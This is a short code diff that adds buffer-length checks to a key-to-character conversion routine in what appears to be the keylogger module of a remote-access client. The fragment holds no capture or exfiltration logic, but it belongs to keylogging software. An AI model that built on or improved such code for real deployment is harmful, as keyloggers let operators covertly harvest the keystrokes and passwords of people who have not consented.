@@ -102,12 +102,14 @@ namespace xClient.Core.Keylogger.WinApi
                     break;
 
                 case 1:
-                    chars = new[] { pwszBuff[0] };
+                    if (pwszBuff.Length > 0) chars = new[] { pwszBuff[0] };
+                    else chars = null;
                     break;
 
                 // Two or more (only two of them is relevant)
                 default:
-                    chars = new[] { pwszBuff[0], pwszBuff[1] };
+                    if (pwszBuff.Length > 1) chars = new[] { pwszBuff[0], pwszBuff[1] };
+                    else chars = new[] { pwszBuff[0] };
                     break;
             }
 
